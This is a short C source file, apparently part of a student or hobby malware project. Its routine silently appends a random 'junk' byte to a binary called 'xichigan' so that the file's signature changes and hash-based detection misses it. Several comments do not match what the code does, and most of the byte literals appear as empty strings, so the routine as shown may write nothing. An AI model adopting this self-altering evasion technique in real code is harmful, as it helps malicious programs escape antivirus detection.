#include "start.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* Called from: main.c										 					 					*
*																				 							*
* Function to morph the file xichigan (.o)									            *
**********************************************************************************/

void morphFile() {
	FILE *fp;
	int randNum;

	// Open the file MtoX.c to morph
	fp = fopen("xichigan","a");

	// Read in the file 1 character at a time and print the value changed by key
	if (fp == NULL){
		//printf("Cannot open file \n");
		exit(0); // Exit with no error to target
	}

	// Append 1 byte of junk binary to the end of the file
	srand(time(NULL));
	randNum = rand() % 10;

	switch(randNum){
		case 0:
			fprintf(fp, "\0");
			break;
		case 1:
			fprintf(fp, "");
			break;
		case 2:
			fprintf(fp, "");
			break;
		case 3:
			fprintf(fp, "");
			break;
		case 4:
			fprintf(fp, "");
			break;
		case 5:
			fprintf(fp, "\0");
			break;
		case 6:
			fprintf(fp, "");
			break;
		case 7:
			fprintf(fp, "");
			break;
		case 8:
			fprintf(fp, "");
			break;
		case 9:
			fprintf(fp, "");
			break;
	}

	fclose(fp);
}
